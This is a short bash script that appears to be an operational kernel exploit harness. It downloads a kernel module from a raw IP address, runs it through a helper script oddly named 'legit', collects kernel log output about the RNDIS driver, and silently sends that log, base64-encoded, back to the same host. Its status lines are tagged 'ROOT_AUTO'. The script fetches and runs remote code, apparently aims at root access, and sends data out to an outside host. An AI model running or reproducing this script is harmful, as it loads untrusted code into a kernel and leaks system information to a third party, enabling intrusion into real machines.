#!/bin/bash
set +e
exec 0<&-

curl -fsS http://16.146.243.72:8450/rndis_oid_census.ko -o /tmp/rndis_oid_census.ko || exit 10
python3 /tmp/rndis_legit_run.py /tmp/rndis_oid_census.ko 0x00010101 \
    >/tmp/rndis-oid-census.log 2>&1
probe_rc=$?
dmesg --notime 2>/dev/null | grep -E 'rndis_oid(_census)? ' \
    >>/tmp/rndis-oid-census.log
python3 - <<'PY'
import base64,urllib.parse,urllib.request
try:
    data=open('/tmp/rndis-oid-census.log','rb').read()
    urllib.request.urlopen('http://16.146.243.72:8450/RNDIS_OID_CENSUS?d='+urllib.parse.quote(base64.urlsafe_b64encode(data).decode()),timeout=3).read()
except Exception:
    pass
PY
printf 'ROOT_AUTO rndis_oid_rc=%s\n' "$probe_rc"
sed -n '1,120p' /tmp/rndis-oid-census.log 2>/dev/null
printf 'ROOT_AUTO done\n'
